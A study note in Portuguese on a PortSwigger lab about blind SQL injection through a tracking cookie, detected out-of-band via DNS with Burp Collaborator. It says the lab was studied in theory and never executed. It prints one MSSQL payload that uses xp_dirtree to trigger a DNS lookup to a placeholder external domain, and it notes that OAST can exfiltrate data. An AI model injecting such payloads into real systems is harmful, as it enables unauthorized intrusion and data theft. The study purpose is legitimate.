# Lab 13: Blind SQL injection with out-of-band interaction

> ⚠️ **AVISO — ESTUDO TEÓRICO, LAB NÃO EXECUTADO**
>
> Este laboratório **não foi realizado na prática**.
>
> O laboratório exige o uso do **Burp Collaborator**, recurso do Burp Suite Professional, que não está disponível na versão utilizada.
>
> Portanto, esta documentação registra o **estudo teórico** do laboratório, baseado na documentação do PortSwigger e na análise do funcionamento dos payloads. Os payloads não foram executados nem validados na prática.

**Vulnerabilidade:** Blind SQL Injection (via cookie, Out-of-Band / OAST - DNS)

**Objetivo:**
Explorar uma Blind SQL Injection executada de forma assíncrona para provocar uma interação DNS com o Burp Collaborator.

### Contexto

A aplicação utiliza o cookie `TrackingId` para analytics e inclui seu valor em uma query SQL.

A query é executada de forma assíncrona e não influencia a resposta HTTP.

Consequentemente, técnicas tradicionais de Blind SQL Injection baseadas em:

- conteúdo da resposta;
- erros SQL;
- tempo de resposta;

não são úteis nesse cenário.

### OAST

**OAST (Out-of-Band Application Security Testing)** permite utilizar um canal externo para observar interações provocadas pelo servidor vulnerável.

Fluxo conceitual:

```text
SQL Injection
      ↓
Banco de dados
      ↓
Interação externa
      ↓
DNS
      ↓
Burp Collaborator
      ↓
Detecção da interação
```

O OAST é a **técnica**, enquanto o Burp Collaborator é uma ferramenta/infraestrutura utilizada para detectar essas interações.

### Burp Collaborator

O Burp Collaborator fornece um domínio único que pode ser monitorado.

Se o servidor vulnerável realizar uma consulta DNS para esse domínio, o Collaborator registra a interação.

Exemplo conceitual:

```text
Servidor vulnerável
       ↓
DNS lookup
       ↓
identificador.burpcollaborator.net
       ↓
Burp Collaborator
       ↓
Interação detectada
```

### DBMS

As técnicas para provocar interações OAST são específicas do DBMS.

O PortSwigger demonstra uma técnica para **Microsoft SQL Server** utilizando `xp_dirtree`.

Exemplo apresentado:

```sql
'; exec master..xp_dirtree '//DOMINIO-COLLABORATOR/a'--
```

A função `xp_dirtree` pode fazer o SQL Server tentar resolver/acessar um caminho de rede, provocando uma consulta DNS para o domínio fornecido.

> **Importante:** `xp_dirtree` não é SQL Injection. É uma funcionalidade do Microsoft SQL Server utilizada dentro da SQL Injection para provocar a interação externa.

### Raciocínio

1. O `TrackingId` é controlável pelo usuário.
2. O valor do cookie é utilizado em uma query SQL.
3. A query é executada de forma assíncrona.
4. A resposta HTTP não depende do resultado da query.
5. Não podemos utilizar conteúdo, erros ou tempo da resposta como sinal.
6. É necessário criar um canal externo observável.
7. DNS é um canal adequado para OAST.
8. O Burp Collaborator fornece um domínio monitorável.
9. Uma função específica do DBMS pode ser utilizada para provocar a resolução DNS.
10. A interação recebida no Collaborator confirma a exploração da Blind SQL Injection.

### Conceitos aprendidos

- Blind SQL Injection pode existir mesmo sem qualquer diferença observável na resposta HTTP.
- Execução assíncrona pode impedir o uso de técnicas tradicionais de Blind SQLi.
- OAST permite utilizar um canal externo para obter feedback.
- DNS é um canal OAST frequentemente utilizado.
- Burp Collaborator permite detectar interações externas.
- A técnica utilizada para provocar o DNS depende do DBMS.
- `xp_dirtree` é uma funcionalidade do Microsoft SQL Server que pode ser utilizada para provocar uma resolução DNS.
- OAST pode ser usado tanto para detecção quanto para exfiltração de dados.

**Status:** ⚠️ Teoria estudada — laboratório não executado.

**Motivo:** Necessidade do Burp Collaborator, disponível no Burp Suite Professional.
